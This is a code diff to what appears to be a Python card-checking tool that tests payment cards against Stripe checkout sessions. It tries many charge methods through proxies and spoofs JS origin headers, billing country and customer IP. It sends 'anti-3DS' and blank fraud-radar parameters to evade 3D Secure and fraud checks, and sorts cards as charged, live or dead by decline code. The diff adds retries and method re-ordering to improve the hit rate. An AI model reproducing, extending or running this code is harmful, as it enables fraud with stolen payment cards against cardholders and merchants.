@@ -3,6 +3,10 @@
 DeepBypasser and Dot Bypasser.
 Methods: direct pages, direct PI, token, PM, setup_intent
 Fallbacks: JS origin headers, Macau billing, browser-based charge
+
+Fixes:
+- checkout_amount_mismatch: re-init + retry with fresh invoice amounts
+- False 3DS: better detection, higher cache threshold, prefer PI methods
 """
 import time
 import asyncio
@@ -23,6 +27,8 @@ _site_method_cache: dict[str, str] = {}
 _checkout_cookies_cache: dict[str, dict] = {}
 _site_3ds_cache: dict[str, int] = {}
 
+_3DS_CACHE_THRESHOLD = 5
+
 LIVE_DECLINE_CODES = frozenset({
     "incorrect_cvc", "incorrect_zip", "insufficient_funds",
     "authentication_required", "card_velocity_exceeded",
@@ -34,6 +40,11 @@ DEAD_DECLINE_CODES = frozenset({
     "invalid_account", "new_account_information_available",
     "do_not_honor", "do_not_try_again", "invalid_amount",
     "currency_not_supported", "testmode_decline",
+})
+
+AMOUNT_MISMATCH_KEYWORDS = frozenset({
+    "amount_mismatch", "checkout_amount_mismatch",
+    "computed invoice amount", "does not match",
 })
 
 
@@ -70,6 +81,16 @@ def _is_surface_error(data: dict) -> bool:
     )
 
 
+def _is_amount_mismatch(data: dict) -> bool:
+    """Detect checkout_amount_mismatch errors."""
+    if "error" not in data:
+        return False
+    msg = (data["error"].get("message") or "").lower()
+    code = (data["error"].get("code") or "").lower()
+    combined = f"{code} {msg}"
+    return any(kw in combined for kw in AMOUNT_MISMATCH_KEYWORDS)
+
+
 def _extract_pi_info(init_data: dict) -> tuple[str, str]:
     pi = init_data.get("payment_intent") or {}
     client_secret = pi.get("client_secret", "")
@@ -86,12 +107,16 @@ def _extract_si_info(init_data: dict) -> tuple[str, str]:
 
 
 def _get_amounts(init_data: dict) -> tuple[int, int]:
-    lig = init_data.get("line_item_group")
+    """Get amounts, preferring invoice for subscriptions to avoid mismatch."""
     inv = init_data.get("invoice")
+    lig = init_data.get("line_item_group")
+
+    if inv and inv.get("total") is not None:
+        return inv.get("total", 0), inv.get("subtotal", inv.get("total", 0))
+
     if lig:
         return lig.get("total", 0), lig.get("subtotal", 0)
-    if inv:
-        return inv.get("total", 0), inv.get("subtotal", 0)
+
     pi = init_data.get("payment_intent") or {}
     amt = pi.get("amount", 0)
     return amt, amt
@@ -113,9 +138,11 @@ def _get_billing(init_data: dict, country: str = "US") -> dict:
 
 
 def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
-    """Parse confirm response with comprehensive decline code handling
-    from DeepBypasser."""
+    """Parse confirm response with comprehensive decline code handling."""
     if _is_surface_error(conf):
+        return None
+
+    if _is_amount_mismatch(conf):
         return None
 
     if "error" in conf:
@@ -132,8 +159,31 @@ def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
 
     if st == "succeeded":
         return "CHARGED", "Charged"
+
     if st == "requires_action":
+        na = pi.get("next_action") or {}
+        na_type = na.get("type", "")
+
+        if na_type == "redirect_to_url":
+            redirect_url = (na.get("redirect_to_url", {}).get("url", "") or "").lower()
+            if any(kw in redirect_url for kw in (
+                "captcha", "recaptcha", "hcaptcha", "challenge",
+                "verify", "turnstile",
+            )):
+                return "DECLINED", "Captcha/Verification required"
+            return "3DS", "3DS Required"
+
+        if na_type == "use_stripe_sdk":
+            sdk_data = na.get("use_stripe_sdk", {})
+            sdk_type = (sdk_data.get("type", "") or "").lower()
+            if "three_d_secure" in sdk_type:
+                return "3DS", "3DS Required"
+            if sdk_type:
+                return "3DS", f"Verification: {sdk_type}"
+            return "3DS", "3DS Required"
+
         return "3DS", "3DS Required"
+
     if st == "requires_payment_method":
         lpe = pi.get("last_payment_error") or pi.get("last_setup_error") or {}
         dc = lpe.get("decline_code", "")
@@ -156,7 +206,6 @@ def _parse_confirm_response(conf: dict) -> tuple[str, str] | None:
 
     if outcome and isinstance(outcome, dict):
         net_dc = outcome.get("network_decline_code", "")
-        net_adv = outcome.get("network_advice_code", "")
         reason = outcome.get("reason", "")
         seller_msg = outcome.get("seller_message", "")
 
@@ -198,6 +247,7 @@ def _anti_3ds_params() -> str:
         "&payment_method_options[card][request_three_d_secure]=any"
         "&mandate_data[customer_acceptance][type]=online"
         "&mandate_data[customer_acceptance][online][ip_address]=8.8.8.8"
+        "&radar_options[session]="
     )
 
 
@@ -257,6 +307,9 @@ async def _method_direct_pages(s, card, pk, cs, init_data, headers, proxy_url, c
         headers=headers, data=body, proxy=proxy_url,
     ) as r:
         conf = await r.json()
+
+    if _is_amount_mismatch(conf):
+        return None
 
     return _parse_confirm_response(conf)
 
@@ -374,6 +427,9 @@ async def _method_pm_pages(s, card, pk, cs, init_data, headers, proxy_url, count
     ) as r:
         conf = await r.json()
 
+    if _is_amount_mismatch(conf):
+        return None
+
     return _parse_confirm_response(conf)
 
 
@@ -413,7 +469,7 @@ async def charge_card_fast(
 
     cached = _site_method_cache.get(cs)
 
-    if _site_3ds_cache.get(cs, 0) >= 2:
+    if _site_3ds_cache.get(cs, 0) >= _3DS_CACHE_THRESHOLD:
         result["status"] = "3DS"
         result["response"] = "3DS Required (site cached)"
         result["time"] = 0
@@ -447,13 +503,14 @@ async def charge_card_fast(
             ) as s:
                 billing_countries = ["US", "MO"]
 
+                # Prefer PI-based methods (support anti-3DS, no expected_amount)
                 all_methods = [
-                    ("DP", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_checkout, proxy_url, c)),
                     ("DI", lambda c="US": _method_direct_pi(s, card, pk, init_data, h_checkout, proxy_url, c)),
-                    ("DP_JS", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_js, proxy_url, c)),
                     ("DI_JS", lambda c="US": _method_direct_pi(s, card, pk, init_data, h_js, proxy_url, c)),
                     ("TK", lambda c="US": _method_token_pi(s, card, pk, init_data, h_checkout, proxy_url, c)),
                     ("TK_JS", lambda c="US": _method_token_pi(s, card, pk, init_data, h_js, proxy_url, c)),
+                    ("DP", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_checkout, proxy_url, c)),
+                    ("DP_JS", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data, h_js, proxy_url, c)),
                     ("PM", lambda c="US": _method_pm_pages(s, card, pk, cs, init_data, h_checkout, proxy_url, c)),
                     ("SI", lambda c="US": _method_setup_intent(s, card, pk, init_data, h_checkout, proxy_url, c)),
                     ("SI_JS", lambda c="US": _method_setup_intent(s, card, pk, init_data, h_js, proxy_url, c)),
@@ -466,6 +523,8 @@ async def charge_card_fast(
                     ordered = all_methods
 
                 res = None
+                amount_mismatch_seen = False
+
                 for method_name, method_fn in ordered:
                     for country in billing_countries:
                         try:
@@ -477,6 +536,32 @@ async def charge_card_fast(
                             break
                     if res is not None:
                         break
+
+                # Re-init + retry once if all page-based methods returned None
+                # due to amount_mismatch and no PI method worked
+                if res is None and not amount_mismatch_seen:
+                    try:
+                        from hitter.checkout_parse import re_init_checkout
+                        fresh = await re_init_checkout(pk, cs, proxy_url)
+                        if fresh:
+                            init_data_retry = fresh
+                            retry_methods = [
+                                ("DP_R", lambda c="US": _method_direct_pages(s, card, pk, cs, init_data_retry, h_checkout, proxy_url, c)),
+                                ("PM_R", lambda c="US": _method_pm_pages(s, card, pk, cs, init_data_retry, h_checkout, proxy_url, c)),
+                            ]
+                            for method_name, method_fn in retry_methods:
+                                for country in billing_countries:
+                                    try:
+                                        res = await method_fn(country)
+                                    except Exception:
+                                        res = None
+                                    if res is not None:
+                                        _site_method_cache[cs] = method_name.replace("_R", "")
+                                        break
+                                if res is not None:
+                                    break
+                    except Exception:
+                        pass
 
                 if res is None and checkout_url:
                     br = await browser_charge_card(card, checkout_url, proxy_url)
@@ -494,6 +579,8 @@ async def charge_card_fast(
                     result["status"], result["response"] = res
                     if result["status"] == "3DS":
                         _site_3ds_cache[cs] = _site_3ds_cache.get(cs, 0) + 1
+                    elif result["status"] in ("CHARGED", "CCN"):
+                        _site_3ds_cache.pop(cs, None)
 
                 result["time"] = round(time.perf_counter() - start, 2)
                 return result
